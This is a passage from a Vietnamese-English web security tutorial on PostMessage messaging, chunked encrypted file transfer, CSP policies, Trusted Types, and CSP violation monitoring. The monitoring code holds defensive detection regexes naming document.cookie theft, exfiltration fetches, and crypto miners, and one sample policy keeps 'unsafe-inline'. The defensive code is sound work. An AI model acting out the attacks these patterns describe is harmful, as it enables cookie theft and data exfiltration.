  // Efficient text diff transmission
  sendTextChange(beforeText, afterText, changePosition) {
    // Calculate minimal diff để reduce message size
    const diff = this.calculateMinimalDiff(beforeText, afterText, changePosition);

    // Use binary diff format cho large changes
    if (diff.totalSize > 1024) {
      diff.compressed = true;
      diff.data = this.compressTextDiff(diff.data);
    }

    this.sendEditMessage({
      operation: 'text_change',
      diff: diff,
      userId: this.userId,
      version: this.documentVersion
    }, 'medium');
  }

  calculateMinimalDiff(before, after, hint) {
    // Optimized diff algorithm sử dụng hint position
    // Implementation của Myers' algorithm với optimizations

    const beforeLength = before.length;
    const afterLength = after.length;

    // Quick checks cho common cases
    if (before === after) return { type: 'no_change' };

    if (beforeLength === 0) {
      return { type: 'insert', position: 0, text: after };
    }

    if (afterLength === 0) {
      return { type: 'delete', position: 0, length: beforeLength };
    }

    // Use hint để optimize search area
    const searchRadius = Math.min(100, Math.max(beforeLength, afterLength) / 4);
    const startSearch = Math.max(0, hint - searchRadius);
    const endSearch = Math.min(beforeLength, hint + searchRadius);

    // Find optimal edit sequence trong search area
    return this.findOptimalEdits(before, after, startSearch, endSearch);
  }

  setupMessageBatching() {
    this.batchBuffer = [];
    this.batchTimer = null;

    const flushBatch = () => {
      if (this.batchBuffer.length === 0) return;

      const batch = {
        type: 'MESSAGE_BATCH',
        messages: [...this.batchBuffer],
        timestamp: performance.now(),
        compressed: false
      };

      this.batchBuffer = [];

      // Compress large batches
      const batchSize = JSON.stringify(batch).length;
      if (batchSize > this.compressionThreshold) {
        batch.compressed = true;
        batch.messages = this.compressBatch(batch.messages);
      }

      this.editorWindow.postMessage(batch, this.editorOrigin);
    };

    // Auto-flush batches
    const scheduleBatchFlush = () => {
      if (this.batchTimer) return;

      this.batchTimer = setTimeout(() => {
        this.batchTimer = null;
        flushBatch();
      }, this.batchInterval);
    };

    // Override message sending để use batching
    const originalSendMessage = this.sendMessage.bind(this);
    this.sendMessage = (message) => {
      this.batchBuffer.push(message);

      if (this.batchBuffer.length >= this.maxBatchSize) {
        clearTimeout(this.batchTimer);
        this.batchTimer = null;
        flushBatch();
      } else {
        scheduleBatchFlush();
      }
    };
  }
}

// Performance monitoring cho PostMessage communication
class PostMessagePerformanceMonitor {
  constructor() {
    this.metrics = {
      messageLatency: [],
      batchProcessingTime: [],
      queueLength: [],
      frameDrops: 0
    };

    this.monitoring = false;
  }

  startMonitoring() {
    this.monitoring = true;
    this.monitorFrameRate();
    this.collectQueueMetrics();
  }

  recordMessageLatency(sendTime, receiveTime) {
    if (!this.monitoring) return;

    const latency = receiveTime - sendTime;
    this.metrics.messageLatency.push(latency);

    // Keep only recent measurements
    if (this.metrics.messageLatency.length > 1000) {
      this.metrics.messageLatency = this.metrics.messageLatency.slice(-500);
    }
  }

  monitorFrameRate() {
    let lastFrameTime = performance.now();
    let frameCount = 0;

    const checkFrameRate = (currentTime) => {
      frameCount++;
      const deltaTime = currentTime - lastFrameTime;

      // Detect dropped frames (>20ms = missed 60 FPS target)
      if (deltaTime > 20) {
        this.metrics.frameDrops++;
      }

      // Report frame rate every second
      if (frameCount >= 60) {
        const avgFrameTime = deltaTime / frameCount;
        const fps = 1000 / avgFrameTime;

        console.log(`📊 PostMessage Performance: ${fps.toFixed(1)} FPS, ${this.metrics.frameDrops} drops`);

        frameCount = 0;
        this.metrics.frameDrops = 0;
      }

      lastFrameTime = currentTime;

      if (this.monitoring) {
        requestAnimationFrame(checkFrameRate);
      }
    };

    requestAnimationFrame(checkFrameRate);
  }

  getPerformanceReport() {
    const latencies = this.metrics.messageLatency;

    return {
      messageLatency: {
        average: latencies.reduce((a, b) => a + b, 0) / latencies.length,
        p50: this.percentile(latencies, 0.5),
        p95: this.percentile(latencies, 0.95),
        p99: this.percentile(latencies, 0.99)
      },

      frameDrops: this.metrics.frameDrops,

      queueHealth: {
        averageLength: this.metrics.queueLength.reduce((a, b) => a + b, 0) / this.metrics.queueLength.length,
        maxLength: Math.max(...this.metrics.queueLength)
      }
    };
  }

  percentile(values, p) {
    const sorted = values.slice().sort((a, b) => a - b);
    const index = Math.floor(p * sorted.length);
    return sorted[index];
  }
}
```


**Q3: Implement secure cross-domain file transfer using PostMessage.**


```javascript
/**
 * Challenge: Transfer large files (up to 100MB) securely giữa domains
 * - File upload widget trong iframe
 * - Progress tracking và cancellation
 * - Chunk-based transfer với error recovery
 * - Client-side encryption before transfer
 * - Integrity verification
 */

class SecureFileTransferChannel {
  constructor(targetOrigin, options = {}) {
    this.targetOrigin = targetOrigin;
    this.chunkSize = options.chunkSize || 64 * 1024; // 64KB chunks
    this.maxFileSize = options.maxFileSize || 100 * 1024 * 1024; // 100MB
    this.encryptionEnabled = options.encryptionEnabled !== false;

    this.activeTransfers = new Map();
    this.transferId = 0;

    this.setupTransferProtocol();
  }

  async uploadFile(file, progressCallback) {
    // Validation
    if (file.size > this.maxFileSize) {
      throw new Error(`File too large: ${file.size} bytes (max: ${this.maxFileSize})`);
    }

    const transferId = ++this.transferId;
    const transfer = {
      id: transferId,
      file: file,
      chunks: [],
      currentChunk: 0,
      totalChunks: Math.ceil(file.size / this.chunkSize),
      status: 'preparing',
      progressCallback,
      encryptionKey: null,
      checksums: []
    };

    this.activeTransfers.set(transferId, transfer);

    try {
      // 1. Generate encryption key nếu needed
      if (this.encryptionEnabled) {
        transfer.encryptionKey = await this.generateEncryptionKey();
      }

      // 2. Prepare chunks
      await this.prepareFileChunks(transfer);

      // 3. Initiate transfer
      await this.initiateTransfer(transfer);

      // 4. Send chunks
      await this.sendFileChunks(transfer);

      // 5. Verify integrity
      await this.verifyTransferIntegrity(transfer);

      return {
        transferId,
        status: 'completed',
        fileHash: transfer.fileHash
      };

    } catch (error) {
      this.cancelTransfer(transferId);
      throw error;
    }
  }

  async prepareFileChunks(transfer) {
    const { file, chunkSize } = transfer;
    const chunks = [];

    // Read file trong chunks và calculate checksums
    for (let offset = 0; offset < file.size; offset += chunkSize) {
      const chunk = file.slice(offset, offset + chunkSize);
      const chunkData = await this.readFileChunk(chunk);

      // Calculate checksum
      const checksum = await this.calculateChecksum(chunkData);

      // Encrypt chunk nếu needed
      let processedData = chunkData;
      if (this.encryptionEnabled) {
        processedData = await this.encryptChunk(chunkData, transfer.encryptionKey);
      }

      chunks.push({
        index: chunks.length,
        data: processedData,
        checksum: checksum,
        size: chunkData.byteLength
      });

      transfer.checksums.push(checksum);
    }

    transfer.chunks = chunks;
    transfer.fileHash = await this.calculateFileHash(file);
  }

  async sendFileChunks(transfer) {
    transfer.status = 'transferring';

    for (let i = 0; i < transfer.chunks.length; i++) {
      const chunk = transfer.chunks[i];

      // Send chunk với retry logic
      await this.sendChunkWithRetry(transfer, chunk);

      // Update progress
      const progress = (i + 1) / transfer.chunks.length;
      if (transfer.progressCallback) {
        transfer.progressCallback(progress, {
          chunkIndex: i,
          totalChunks: transfer.chunks.length,
          bytesTransferred: (i + 1) * this.chunkSize
        });
      }

      // Check for cancellation
      if (transfer.status === 'cancelled') {
        throw new Error('Transfer cancelled');
      }
    }
  }

  async sendChunkWithRetry(transfer, chunk, maxRetries = 3) {
    for (let attempt = 0; attempt <= maxRetries; attempt++) {
      try {
        await this.sendMessage({
          type: 'FILE_CHUNK',
          transferId: transfer.id,
          chunkIndex: chunk.index,
          data: this.arrayBufferToBase64(chunk.data),
          checksum: chunk.checksum,
          isLastChunk: chunk.index === transfer.chunks.length - 1
        });

        // Wait for acknowledgment
        await this.waitForChunkAck(transfer.id, chunk.index);
        return; // Success

      } catch (error) {
        if (attempt === maxRetries) {
          throw new Error(`Failed to send chunk ${chunk.index} after ${maxRetries} attempts: ${error.message}`);
        }

        // Exponential backoff
        await this.delay(Math.pow(2, attempt) * 1000);
      }
    }
  }

  setupTransferProtocol() {
    window.addEventListener('message', (event) => {
      if (event.origin !== this.targetOrigin) return;

      const message = event.data;

      switch (message.type) {
        case 'TRANSFER_READY':
          this.handleTransferReady(message);
          break;

        case 'CHUNK_ACK':
          this.handleChunkAcknowledgment(message);
          break;

        case 'TRANSFER_ERROR':
          this.handleTransferError(message);
          break;

        case 'INTEGRITY_CHECK_RESULT':
          this.handleIntegrityCheckResult(message);
          break;
      }
    });
  }

  async generateEncryptionKey() {
    // Generate AES-256 key cho file encryption
    return await window.crypto.subtle.generateKey(
      { name: 'AES-GCM', length: 256 },
      true,
      ['encrypt', 'decrypt']
    );
  }

  async encryptChunk(data, key) {
    const iv = window.crypto.getRandomValues(new Uint8Array(12));

    const encrypted = await window.crypto.subtle.encrypt(
      { name: 'AES-GCM', iv: iv },
      key,
      data
    );

    // Prepend IV to encrypted data
    const result = new Uint8Array(iv.length + encrypted.byteLength);
    result.set(iv);
    result.set(new Uint8Array(encrypted), iv.length);

    return result.buffer;
  }

  async calculateChecksum(data) {
    const hashBuffer = await window.crypto.subtle.digest('SHA-256', data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
  }

  arrayBufferToBase64(buffer) {
    const bytes = new Uint8Array(buffer);
    let binary = '';
    for (let i = 0; i < bytes.byteLength; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    return btoa(binary);
  }

  cancelTransfer(transferId) {
    const transfer = this.activeTransfers.get(transferId);
    if (transfer) {
      transfer.status = 'cancelled';

      this.sendMessage({
        type: 'TRANSFER_CANCELLED',
        transferId: transferId
      });

      this.activeTransfers.delete(transferId);
    }
  }
}

// File receiver implementation:
class SecureFileReceiver {
  constructor(allowedOrigin) {
    this.allowedOrigin = allowedOrigin;
    this.activeReceives = new Map();

    this.setupReceiveProtocol();
  }

  setupReceiveProtocol() {
    window.addEventListener('message', async (event) => {
      if (event.origin !== this.allowedOrigin) return;

      const message = event.data;

      try {
        switch (message.type) {
          case 'TRANSFER_INIT':
            await this.handleTransferInit(message, event.source);
            break;

          case 'FILE_CHUNK':
            await this.handleFileChunk(message, event.source);
            break;

          case 'TRANSFER_CANCELLED':
            this.handleTransferCancellation(message);
            break;
        }
      } catch (error) {
        this.sendErrorMessage(event.source, message.transferId, error.message);
      }
    });
  }

  async handleFileChunk(message, source) {
    const receive = this.activeReceives.get(message.transferId);
    if (!receive) {
      throw new Error(`Unknown transfer: ${message.transferId}`);
    }

    // Decode chunk data
    const chunkData = this.base64ToArrayBuffer(message.data);

    // Verify checksum
    const calculatedChecksum = await this.calculateChecksum(chunkData);
    if (calculatedChecksum !== message.checksum) {
      throw new Error(`Chunk ${message.chunkIndex} checksum mismatch`);
    }

    // Store chunk
    receive.chunks[message.chunkIndex] = {
      data: chunkData,
      checksum: message.checksum,
      received: true
    };

    // Send acknowledgment
    source.postMessage({
      type: 'CHUNK_ACK',
      transferId: message.transferId,
      chunkIndex: message.chunkIndex
    }, this.allowedOrigin);

    // Check if transfer complete
    if (message.isLastChunk) {
      await this.completeFileReceive(receive, source);
    }
  }

  async completeFileReceive(receive, source) {
    // Reconstruct file từ chunks
    const fileBlob = await this.reconstructFile(receive);

    // Verify file integrity
    const fileHash = await this.calculateFileHash(fileBlob);
    const integrityValid = fileHash === receive.expectedHash;

    // Send integrity check result
    source.postMessage({
      type: 'INTEGRITY_CHECK_RESULT',
      transferId: receive.id,
      success: integrityValid,
      fileHash: fileHash
    }, this.allowedOrigin);

    if (integrityValid) {
      // Trigger file download hoặc processing
      this.processReceivedFile(receive.fileName, fileBlob);
    }

    this.activeReceives.delete(receive.id);
  }
}
```


---


## 📖 PHẦN VI: MODERN BROWSER SECURITY FEATURES


### 🌱 8. CONTENT SECURITY POLICY (CSP) & CROSS-DOMAIN


#### 🔬 CSP Evolution & Cross-Domain Implications


**The Modern Web Security Challenge:**


Modern web applications integrate với numerous third-party services: analytics, payment processors, social media widgets, CDNs, advertising networks. Traditional Same-Origin Policy alone không đủ để handle complex security requirements của modern web.


Content Security Policy được introduced như một **defense-in-depth mechanism** để:


1. Prevent XSS attacks bằng cách restrict script execution
2. Control resource loading từ external domains
3. Enforce HTTPS communication
4. Prevent data exfiltration attempts
5. Control cross-origin communication channels


**CSP Header Architecture:**


```javascript
// CSP v1 (Basic directives)
const cspV1 = `
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.company.com;
`;

// CSP v2 (Hash và nonce support)
const cspV2 = `
  default-src 'self';
  script-src 'self' 'nonce-abc123' 'sha256-xyz789';
  style-src 'self' 'sha256-abc456';
  frame-ancestors 'none';
  base-uri 'self';
`;

// CSP v3 (Advanced features)
const cspV3 = `
  default-src 'self';
  script-src 'self' 'strict-dynamic' 'nonce-abc123';
  object-src 'none';
  base-uri 'none';
  require-trusted-types-for 'script';
  trusted-types myPolicy;
`;
```


#### 💡 Production CSP Configuration - Real-World Examples


**Enterprise CSP Implementation - Kinh nghiệm từ Figma:**


Tại Figma, chúng tôi faced unique challenges với CSP vì application cần support:


- User-generated content (designs, prototypes)
- Third-party plugins và integrations
- Embedded widgets từ various services
- Real-time collaboration features
- File uploads/downloads từ multiple domains


```javascript
// Figma's Progressive CSP Implementation
class DynamicCSPManager {
  constructor() {
    this.basePolicy = {
      'default-src': ["'self'"],
      'script-src': [
        "'self'",
        "'unsafe-inline'", // Temporary - being phased out
        'https://www.google-analytics.com',
        'https://www.googletagmanager.com',
        'https://js.stripe.com'
      ],
      'style-src': [
        "'self'",
        "'unsafe-inline'", // Required for dynamic styling
        'https://fonts.googleapis.com'
      ],
      'img-src': [
        "'self'",
        'data:',
        'blob:',
        'https:', // Allow all HTTPS images for user content
        'https://www.google-analytics.com'
      ],
      'connect-src': [
        "'self'",
        'https://api.figma.com',
        'https://s3.amazonaws.com',
        'https://www.google-analytics.com',
        'wss://multiplayer.figma.com' // WebSocket connections
      ],
      'font-src': [
        "'self'",
        'https://fonts.gstatic.com',
        'data:'
      ],
      'frame-src': [
        "'self'",
        'https://js.stripe.com', // Payment frames
        'https://www.youtube.com', // Embedded videos
        'https://player.vimeo.com'
      ],
      'media-src': [
        "'self'",
        'blob:',
        'https:'
      ]
    };

    this.environmentOverrides = this.getEnvironmentOverrides();
    this.pluginDomains = new Set(); // Dynamic plugin domains
  }

  getEnvironmentOverrides() {
    const env = process.env.NODE_ENV;

    switch (env) {
      case 'development':
        return {
          'script-src': [
            'http://localhost:*',
            'ws://localhost:*',
            "'unsafe-eval'" // For development tools
          ],
          'connect-src': [
            'http://localhost:*',
            'ws://localhost:*'
          ]
        };

      case 'staging':
        return {
          'script-src': [
            'https://*.staging.figma.com'
          ],
          'connect-src': [
            'https://*.staging.figma.com'
          ]
        };

      case 'production':
        return {
          // Strict production policies
          'upgrade-insecure-requests': true,
          'block-all-mixed-content': true
        };

      default:
        return {};
    }
  }

  // Dynamic CSP cho user-installed plugins
  registerPluginDomain(domain) {
    if (this.isValidPluginDomain(domain)) {
      this.pluginDomains.add(domain);
      this.updateCSPHeader();
    }
  }

  isValidPluginDomain(domain) {
    // Validate against allowlist của approved plugin domains
    const approvedDomains = [
      /^https:\/\/[\w-]+\.figma\.com$/,
      /^https:\/\/[\w-]+\.figmaplugins\.com$/,
      /^https:\/\/plugins\.[\w-]+\.com$/
    ];

    return approvedDomains.some(pattern => pattern.test(domain));
  }

  generateCSPHeader() {
    const policy = { ...this.basePolicy };

    // Apply environment overrides
    for (const [directive, sources] of Object.entries(this.environmentOverrides)) {
      if (Array.isArray(sources)) {
        policy[directive] = [...(policy[directive] || []), ...sources];
      } else if (typeof sources === 'boolean') {
        policy[directive] = sources;
      }
    }

    // Add dynamic plugin domains
    if (this.pluginDomains.size > 0) {
      policy['script-src'] = [...policy['script-src'], ...this.pluginDomains];
      policy['connect-src'] = [...policy['connect-src'], ...this.pluginDomains];
    }

    // Convert to CSP header string
    return Object.entries(policy)
      .map(([directive, sources]) => {
        if (typeof sources === 'boolean') {
          return sources ? directive : '';
        }
        return `${directive} ${sources.join(' ')}`;
      })
      .filter(Boolean)
      .join('; ');
  }

  updateCSPHeader() {
    const newPolicy = this.generateCSPHeader();

    // Update meta tag CSP (for dynamically loaded content)
    let cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
    if (!cspMeta) {
      cspMeta = document.createElement('meta');
      cspMeta.setAttribute('http-equiv', 'Content-Security-Policy');
      document.head.appendChild(cspMeta);
    }
    cspMeta.setAttribute('content', newPolicy);

    // Log policy update for debugging
    console.log('🔒 CSP Updated:', newPolicy);
  }
}

// Server-side CSP middleware
const cspManager = new DynamicCSPManager();

app.use((req, res, next) => {
  const cspPolicy = cspManager.generateCSPHeader();

  // Set CSP header
  res.setHeader('Content-Security-Policy', cspPolicy);

  // Also set report-only header for monitoring
  res.setHeader('Content-Security-Policy-Report-Only',
    cspPolicy + '; report-uri https://csp-reporting.figma.com/report');

  next();
});
```


#### 🔍 Advanced CSP Patterns cho Cross-Domain Scenarios


**Pattern 1: Nonce-Based CSP với Dynamic Script Loading**


```javascript
// Server-side nonce generation
class CSPNonceManager {
  constructor() {
    this.nonceCache = new Map();
    this.nonceTTL = 300000; // 5 minutes

    // Cleanup expired nonces
    setInterval(() => this.cleanupExpiredNonces(), 60000);
  }

  generateNonce(userId = 'anonymous') {
    const nonce = this.cryptoRandomString(32);
    const expiresAt = Date.now() + this.nonceTTL;

    this.nonceCache.set(nonce, {
      userId,
      createdAt: Date.now(),
      expiresAt,
      used: false
    });

    return nonce;
  }

  validateAndMarkNonce(nonce) {
    const nonceData = this.nonceCache.get(nonce);

    if (!nonceData) {
      return { valid: false, reason: 'nonce_not_found' };
    }

    if (nonceData.used) {
      return { valid: false, reason: 'nonce_already_used' };
    }

    if (Date.now() > nonceData.expiresAt) {
      this.nonceCache.delete(nonce);
      return { valid: false, reason: 'nonce_expired' };
    }

    // Mark as used (single-use nonce)
    nonceData.used = true;

    return { valid: true, userId: nonceData.userId };
  }

  cryptoRandomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    const randomArray = new Uint8Array(length);
    crypto.getRandomValues(randomArray);

    for (let i = 0; i < length; i++) {
      result += chars[randomArray[i] % chars.length];
    }

    return result;
  }
}

// Client-side dynamic script loading với nonce
class SecureScriptLoader {
  constructor() {
    this.loadedScripts = new Set();
    this.pendingLoads = new Map();
  }

  async loadScript(src, options = {}) {
    // Check if already loaded
    if (this.loadedScripts.has(src)) {
      return Promise.resolve();
    }

    // Check if currently loading
    if (this.pendingLoads.has(src)) {
      return this.pendingLoads.get(src);
    }

    // Create loading promise
    const loadPromise = this.createScriptLoadPromise(src, options);
    this.pendingLoads.set(src, loadPromise);

    try {
      await loadPromise;
      this.loadedScripts.add(src);
      return;
    } finally {
      this.pendingLoads.delete(src);
    }
  }

  async createScriptLoadPromise(src, options) {
    // Get fresh nonce từ server
    const nonce = await this.fetchNonce();

    return new Promise((resolve, reject) => {
      const script = document.createElement('script');
      script.src = src;
      script.nonce = nonce; // CSP nonce

      if (options.async !== false) {
        script.async = true;
      }

      if (options.defer) {
        script.defer = true;
      }

      // Add integrity check nếu provided
      if (options.integrity) {
        script.integrity = options.integrity;
        script.crossOrigin = 'anonymous';
      }

      script.onload = () => {
        console.log(`✅ Script loaded: ${src}`);
        resolve();
      };

      script.onerror = (error) => {
        console.error(`❌ Script failed to load: ${src}`, error);
        document.head.removeChild(script);
        reject(new Error(`Failed to load script: ${src}`));
      };

      // Check CSP violation
      script.addEventListener('securitypolicyviolation', (e) => {
        console.error('🚨 CSP Violation:', e);
        reject(new Error(`CSP violation loading script: ${src}`));
      });

      document.head.appendChild(script);

      // Timeout handling
      setTimeout(() => {
        if (!this.loadedScripts.has(src)) {
          document.head.removeChild(script);
          reject(new Error(`Script load timeout: ${src}`));
        }
      }, options.timeout || 10000);
    });
  }

  async fetchNonce() {
    try {
      const response = await fetch('/api/csp/nonce', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'same-origin'
      });

      if (!response.ok) {
        throw new Error(`Nonce fetch failed: ${response.status}`);
      }

      const data = await response.json();
      return data.nonce;

    } catch (error) {
      console.error('Failed to fetch CSP nonce:', error);
      throw error;
    }
  }
}

// Usage:
const scriptLoader = new SecureScriptLoader();

// Load third-party analytics với CSP nonce
await scriptLoader.loadScript('https://www.google-analytics.com/analytics.js', {
  integrity: 'sha384-xyz123...', // SRI hash
  timeout: 5000
});

// Load payment widget
await scriptLoader.loadScript('https://js.stripe.com/v3/', {
  async: false, // Load synchronously if needed
  timeout: 8000
});
```


**Pattern 2: CSP với Trusted Types for XSS Prevention**


```javascript

```


**Pattern 2: CSP với Trusted Types for XSS Prevention**


```javascript
// Trusted Types implementation cho secure DOM manipulation
class SecureDOMPolicy {
  constructor() {
    this.policy = null;
    this.initialized = false;

    this.initializeTrustedTypes();
  }

  initializeTrustedTypes() {
    if (!window.trustedTypes) {
      console.warn('Trusted Types not supported in this browser');
      return;
    }

    try {
      // Create trusted policy với strict rules
      this.policy = trustedTypes.createPolicy('secure-dom-policy', {
        createHTML: (input) => this.sanitizeHTML(input),
        createScript: (input) => this.sanitizeScript(input),
        createScriptURL: (input) => this.sanitizeScriptURL(input)
      });

      this.initialized = true;
      console.log('✅ Trusted Types policy initialized');

    } catch (error) {
      console.error('Failed to initialize Trusted Types policy:', error);
    }
  }

  sanitizeHTML(input) {
    // Use DOMPurify hoặc similar sanitization library
    if (!window.DOMPurify) {
      throw new Error('DOMPurify not available for HTML sanitization');
    }

    // Strict configuration cho user-generated content
    const cleanHTML = DOMPurify.sanitize(input, {
      ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'ol', 'ul', 'li', 'a'],
      ALLOWED_ATTR: ['href', 'target', 'rel'],
      ALLOW_DATA_ATTR: false,
      FORBID_SCRIPT: true,
      FORBID_TAGS: ['script', 'object', 'embed', 'iframe', 'form', 'input'],
      USE_PROFILES: { html: true }
    });

    // Additional validation
    if (this.containsSuspiciousContent(cleanHTML)) {
      throw new Error('Content contains suspicious patterns');
    }

    return cleanHTML;
  }

  sanitizeScript(input) {
    // Very restrictive - only allow specific patterns
    const allowedPatterns = [
      /^console\.log\(['"][^'"]*['"]\);?$/, // Console logs
      /^window\.__analytics__\s*=\s*\{[^}]*\};?$/, // Analytics config
      /^document\.dispatchEvent\(new CustomEvent\(['"][^'"]*['"][^)]*\)\);?$/ // Custom events
    ];

    const isAllowed = allowedPatterns.some(pattern => pattern.test(input.trim()));

    if (!isAllowed) {
      throw new Error(`Script content not allowed: ${input.substring(0, 100)}...`);
    }

    return input;
  }

  sanitizeScriptURL(input) {
    // Whitelist trusted script sources
    const trustedDomains = [
      'https://www.google-analytics.com',
      'https://js.stripe.com',
      'https://cdn.jsdelivr.net',
      'https://unpkg.com'
    ];

    let url;
    try {
      url = new URL(input);
    } catch (error) {
      throw new Error(`Invalid script URL: ${input}`);
    }

    // Must be HTTPS
    if (url.protocol !== 'https:') {
      throw new Error(`Script URL must use HTTPS: ${input}`);
    }

    // Must be từ trusted domain
    const origin = `${url.protocol}//${url.hostname}`;
    const isTrusted = trustedDomains.some(domain =>
      origin === domain || origin.endsWith('.' + domain.replace('https://', ''))
    );

    if (!isTrusted) {
      throw new Error(`Script URL from untrusted domain: ${input}`);
    }

    return input;
  }

  containsSuspiciousContent(content) {
    const suspiciousPatterns = [
      /javascript:/i,
      /on\w+\s*=/i, // Event handlers
      /expression\s*\(/i, // IE expressions
      /<script/i,
      /eval\s*\(/i,
      /setTimeout\s*\(/i,
      /setInterval\s*\(/i
    ];

    return suspiciousPatterns.some(pattern => pattern.test(content));
  }

  // Safe DOM manipulation methods
  setInnerHTML(element, html) {
    if (!this.initialized) {
      // Fallback to regular sanitization
      element.innerHTML = this.sanitizeHTML(html);
      return;
    }

    try {
      const trustedHTML = this.policy.createHTML(html);
      element.innerHTML = trustedHTML;
    } catch (error) {
      console.error('Failed to set innerHTML safely:', error);
      throw error;
    }
  }

  executeScript(scriptContent) {
    if (!this.initialized) {
      throw new Error('Cannot execute script: Trusted Types not initialized');
    }

    try {
      const trustedScript = this.policy.createScript(scriptContent);

      // Create script element với trusted content
      const script = document.createElement('script');
      script.text = trustedScript;

      document.head.appendChild(script);
      document.head.removeChild(script);

    } catch (error) {
      console.error('Failed to execute script safely:', error);
      throw error;
    }
  }

  loadExternalScript(src) {
    if (!this.initialized) {
      throw new Error('Cannot load script: Trusted Types not initialized');
    }

    return new Promise((resolve, reject) => {
      try {
        const trustedURL = this.policy.createScriptURL(src);

        const script = document.createElement('script');
        script.src = trustedURL;
        script.async = true;

        script.onload = resolve;
        script.onerror = () => reject(new Error(`Failed to load script: ${src}`));

        document.head.appendChild(script);

      } catch (error) {
        reject(error);
      }
    });
  }
}

// Usage throughout application:
const secureDOM = new SecureDOMPolicy();

// Safe HTML insertion
try {
  secureDOM.setInnerHTML(userContentDiv, userGeneratedHTML);
} catch (error) {
  console.error('Unsafe content blocked:', error);
  userContentDiv.textContent = 'Content blocked for security reasons';
}

// Safe script execution
try {
  secureDOM.executeScript('console.log("Safe script executed");');
} catch (error) {
  console.error('Script blocked:', error);
}

// Safe external script loading
try {
  await secureDOM.loadExternalScript('https://js.stripe.com/v3/');
  console.log('Stripe script loaded safely');
} catch (error) {
  console.error('Failed to load external script:', error);
}
```


**Pattern 3: CSP Monitoring & Violation Analysis**


```javascript
// Comprehensive CSP violation monitoring system
class CSPViolationMonitor {
  constructor(options = {}) {
    this.reportEndpoint = options.reportEndpoint || '/api/csp/violations';
    this.batchSize = options.batchSize || 10;
    this.flushInterval = options.flushInterval || 30000; // 30 seconds

    this.violationQueue = [];
    this.violationStats = new Map();
    this.patterns = new Map();

    this.setupViolationListener();
    this.startBatchProcessor();
  }

  setupViolationListener() {
    // Listen cho CSP violations
    document.addEventListener('securitypolicyviolation', (event) => {
      this.handleViolation({
        type: 'csp_violation',
        directive: event.violatedDirective,
        blockedURI: event.blockedURI,
        sourceFile: event.sourceFile,
        lineNumber: event.lineNumber,
        columnNumber: event.columnNumber,
        originalPolicy: event.originalPolicy,
        effectiveDirective: event.effectiveDirective,
        sample: event.sample,
        disposition: event.disposition, // 'enforce' or 'report'
        timestamp: Date.now(),
        userAgent: navigator.userAgent,
        url: window.location.href
      });
    });

    // Listen cho Trusted Types violations (if supported)
    if (window.trustedTypes) {
      window.addEventListener('unhandledrejection', (event) => {
        if (event.reason && event.reason.message &&
            event.reason.message.includes('Trusted Type')) {
          this.handleViolation({
            type: 'trusted_types_violation',
            error: event.reason.message,
            stack: event.reason.stack,
            timestamp: Date.now(),
            url: window.location.href
          });
        }
      });
    }
  }

  handleViolation(violation) {
    // Enhanced violation analysis
    violation.analysisId = this.generateAnalysisId(violation);
    violation.severity = this.calculateSeverity(violation);
    violation.category = this.categorizeViolation(violation);
    violation.potentialAttack = this.detectPotentialAttack(violation);

    // Update statistics
    this.updateViolationStats(violation);

    // Add to processing queue
    this.violationQueue.push(violation);

    // Immediate processing cho high-severity violations
    if (violation.severity === 'high' || violation.potentialAttack) {
      this.processHighPriorityViolation(violation);
    }

    // Flush queue if full
    if (this.violationQueue.length >= this.batchSize) {
      this.flushViolations();
    }
  }

  generateAnalysisId(violation) {
    // Create unique ID based on violation characteristics
    const key = [
      violation.directive,
      violation.blockedURI || violation.error,
      violation.sourceFile,
      violation.lineNumber
    ].filter(Boolean).join('|');

    return btoa(key).replace(/[^a-zA-Z0-9]/g, '').substring(0, 12);
  }

  calculateSeverity(violation) {
    // High severity indicators
    const highSeverityPatterns = [
      /javascript:/i,
      /data:.*script/i,
      /eval\(/i,
      /document\.write/i,
      /innerHTML.*<script/i
    ];

    // Medium severity indicators
    const mediumSeverityPatterns = [
      /unsafe-inline/i,
      /unsafe-eval/i,
      /'self'/i
    ];

    const content = [
      violation.blockedURI,
      violation.sample,
      violation.error
    ].filter(Boolean).join(' ');

    if (highSeverityPatterns.some(pattern => pattern.test(content))) {
      return 'high';
    }

    if (mediumSeverityPatterns.some(pattern => pattern.test(content))) {
      return 'medium';
    }

    return 'low';
  }

  categorizeViolation(violation) {
    if (violation.type === 'trusted_types_violation') {
      return 'trusted_types';
    }

    const directive = violation.directive || violation.effectiveDirective;

    switch (directive) {
      case 'script-src':
      case 'script-src-elem':
        return 'script_execution';

      case 'style-src':
      case 'style-src-elem':
        return 'style_injection';

      case 'img-src':
        return 'image_loading';

      case 'connect-src':
        return 'network_request';

      case 'frame-src':
      case 'child-src':
        return 'frame_embedding';

      default:
        return 'other';
    }
  }

  detectPotentialAttack(violation) {
    const attackPatterns = [
      // XSS indicators
      /javascript:.*alert/i,
      /javascript:.*document\.cookie/i,
      /on\w+\s*=.*script/i,

      // Data exfiltration
      /fetch.*\/\/[^\/]*\.(?:tk|ml|ga|cf)/i,
      /XMLHttpRequest.*\/\/(?![\w-]+\.mycompany\.com)/i,

      // Crypto mining
      /coinhive|crypto-loot|minr\.info/i,

      // Common attack domains
      /\/\/.*\.(?:bit\.ly|tinyurl|t\.co|goo\.gl)\/.*script/i
    ];

    const content = [
      violation.blockedURI,
      violation.sample,
      violation.sourceFile
    ].filter(Boolean).join(' ');

    return attackPatterns.some(pattern => pattern.test(content));
  }

  updateViolationStats(violation) {
    const key = `${violation.category}:${violation.analysisId}`;
    const stats = this.violationStats.get(key) || {
      count: 0,
      firstSeen: violation.timestamp,
      lastSeen: violation.timestamp,
      severity: violation.severity,
      category: violation.category,
      sample: violation
    };

    stats.count++;
    stats.lastSeen = violation.timestamp;

    this.violationStats.set(key, stats);
  }

  processHighPriorityViolation(violation) {
    // Immediate alert cho potential attacks
    if (violation.potentialAttack) {
      this.sendSecurityAlert({
        type: 'potential_attack_detected',
        violation,
        timestamp: Date.now(),
        userSession: this.getUserSession()
      });
    }

    // Log to console cho debugging
